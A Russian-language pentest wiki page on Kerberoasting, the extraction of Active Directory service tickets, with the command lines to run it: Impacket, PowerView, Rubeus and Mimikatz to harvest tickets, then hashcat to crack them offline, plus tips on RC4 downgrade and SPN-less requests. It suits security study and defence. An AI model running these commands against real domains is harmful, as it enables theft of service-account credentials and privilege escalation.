# Kerberoast

## Об атаке кратко

Можем запросить TGS для любого сервиса, зарегистрированного в AD (независимо запущен ли он, и имеем ли право авторизоваться в нем через Kerberos-протокол). Надо знать SPN сервиса.  TGS шифруются на ключе, который вычисляется из пароля  пользователя-владельца AP (сервис-служба, к которому запрашивают доступ).

Если AP — служба, зарегистрированная на системном аккаунте компьютера, то пароль — 120-символьная строка, меняющаяся каждый месяц — не переберешь. Но если владелец AP  — обычный пользователь, то пароль может быть слабым и не меняться часто.&#x20;

Суть атаки Kerberoast — запросить TGS для служб, запущенных обычными пользователями и попробовать перебрать к ним пароль. Обычно, пользователи, которые запускают свои сервисы в домене, имеют доп привилегии, что крайне полезно.

**Ключевое требование**: нужен доступ в домен под непривилегированной УЗ

## Tools

### LDAP Filter

Получить всех пользователей, для которых указаны SPN (= пользователи-владельцы сервисов):

```
(&(samAccountType=805306368)(servicePrincipalName=*))
```

### Get TGS

* Impacket: GetUserSPNs — [https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
* Rubeus Kerberoast — [https://github.com/GhostPack/Rubeus#kerberoast](https://github.com/GhostPack/Rubeus#kerberoast)
* Empire Invoke-Kerberoast.ps1 — [https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/Invoke-Kerberoast.ps1)
* RiskySPN — [https://github.com/cyberark/RiskySPN](https://github.com/cyberark/RiskySPN)

### Brute TGS

Hashcat: [https://github.com/hashcat/hashcat](https://github.com/hashcat/hashcat)

## Пример:

### Получаем тикеты

#### Remote

{% tabs %}
{% tab title="Impacket" %}
```
GetUserSPNs.py 'contoso.local/Anakin:Vader1234!' -dc-ip 192.168.100.2 -outputfile kerberoast-hashes.txt
```
{% endtab %}

{% tab title="PowerView" %}
```
Найти Service accounts
    Get-NetUser -SPN

Request a ticket remotely:
    Request-SPNTicket

Kerberoast:
    Invoke-Kerberoast
    
Kerberoast с получением тикета в формате для Hashcat
    Get-DomainSPNTicket -SPN "MSSQLSvc/db1.example.local" -OutputFormat Hashcat | select Hash -ExpandProperty Hash | Out-File -Width 5000 -Encoding "UTF8" ..\mssqlsvc_kerb.txt
```
{% endtab %}

{% tab title="AD Module" %}
```
Найти Service accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
{% endtab %}

{% tab title="Rubeus" %}
```
Так же, локально можно получить билет с помощью Rubeus
PS> Rubeus.exe kerberoast
```
{% endtab %}
{% endtabs %}

Через системные утилиты

{% tabs %}
{% tab title="PowerShell" %}
```
Request a ticket:
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “MSSQLSvc/ops-file.offensiveps.powershell.local:SQLEXPRESS”

```
{% endtab %}

{% tab title="CMD" %}
```
Выполнить атаку можно как удаленно, 
так и при наличии непосредственного доступа к системе. 
Но для начала нужно получить все SPN из системы. 
Если есть доступ, следует использовать встроенное решение setspn.

setspn -T [домен] -Q */*

Примеры
Create new SPN and assign it an account that already exists
    setspn -s HTP/test.acme.local ACME\serviceFakeHTTP
    
Request SPN
    setspn -Q HTTP/*
```
{% endtab %}
{% endtabs %}

Проверить, что тикет предоставлен:&#x20;

```
klist.exe
```

#### Local

* Экспорт всех тикетов, используя Mimikatz

```
> Invoke-Mimikatz -Command '"kerberos::list /export"'
```

* Экспорт всех тикетов через [Invoke-Kerberoast.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module\_source/credentials/Invoke-Kerberoast.ps1)

```
> Import-Module .\Invoke-Kerberoast.ps1
> Invoke-Kerberoast -OutputFormat Hashcat -ErrorAction SilentyContinue | ft -HideableHeaders -AutoSize Hash Out-File -Width 5000 -Encoding "UTF8" .\kerb.txt
```

### Перебор пароля

Взлом пароля Service account

```
python.exe .\tgsrepcrack.py .\passwords.txt '.\some.key'

или hashcat
hashcat -a 0 -m 13100 krb5.hashes dict.txt
```

### Замечание

Kerberoast можно также выполнить, перехватив сетевой трафик и захватив билеты Kerberos TGS в случае MITM.

## Tips

### RC4

Можно попробовать запросить TGS с RC4, чтобы брутить было легче, но по умолчанию приходит с AES256.

### AnySPN

Есть возможность запросить TGS не зная SPN. Это как-то связано с principle type — `NT-ENTERPRISE`. Этот метод встроен в Impacket GetUserSPNs.py, в Rubeus его можно вызвать через `/enterprise` флаг.

Подробнее:

* [https://swarm.ptsecurity.com/kerberoasting-without-spns/](https://swarm.ptsecurity.com/kerberoasting-without-spns/)
* [https://zer1t0.gitlab.io/posts/attacking\_ad/#kerberoast](https://zer1t0.gitlab.io/posts/attacking\_ad/#kerberoast)

### Validated-SPN

Если мы имеем этот permission, то мы можем добавить SPN в наш аккаунт, тем самым наш акк становится подверженным этой атаке. Мы запрашиваем TGS токен для себя и пробуем перебрать пароль свой. По умолчанию аккаунты не имеют этого разрешения.

## Об атаке чуть подробнее

Реализация протокола Kerberos в Windows использует имена участников службы (SPN) для определения того, какую учетную запись задействовать для шифрования билета службы. В Active Directory существует два варианта SPN: SPN на основе хоста и произвольные SPN. Первый вариант SPN связан с учетной записью компьютера домена, а второй обычно (но не всегда) — с учеткой пользователя домена.

В документации Microsoft написано буквально следующее: «Когда в Active Directory создается новая учетная запись компьютера, для встроенных служб автоматически создаются имена участников-служб. В действительности имена участников-служб создаются только для службы HOST, а все встроенные службы используют имя участника-службы HOST». Но так как пароль учетной записи компьютера по умолчанию рандомный и меняется каждые 30 дней, оператор в контексте данной атаки, как правило, не обращает внимания на имена SPN на основе хоста.

Произвольные имена участников-служб также могут быть зарегистрированы для учетных записей пользователей домена. Наример, учетная запись службы, которая управляет несколькими экземплярами MSSQL. Таким образом, учетная запись пользователя по умолчанию будет иметь SPN \<MSSQLSvc/HOST:PORT> для каждого экземпляра MSSQL, для которого она зарегистрирована. Эта учетная запись хранится в атрибуте ServicePrincipalName профиля пользователя.

Как следует из специфики работы Kerberos, любой пользователь может запросить TGS для любой службы, имеющей зарегистрированное SPN для учетной записи пользователя или компьютера в Active Directory. Таким образом, зная учетные данные любого пользователя домена и SPN учетных записей из домена, оператор может запросить TGS от имени пользователя для данных экземпляров SPN. А взломав TGS, узнать пароли от этих учетных записей.

Kerberos Session Ticket (TGS-REP, который), содержит в себе часть, которая зашифрована с использованием хеша пароля от service accounts (SPN для сервиса имееется ввиду). Это делает возможным запросить тикет и брутить его оффлайн.

Как правило service accounts редко меняют пароли и имеют привилегированный доступ

Хеши паролей service accounts могут быть использованы для создания Silver Tickets
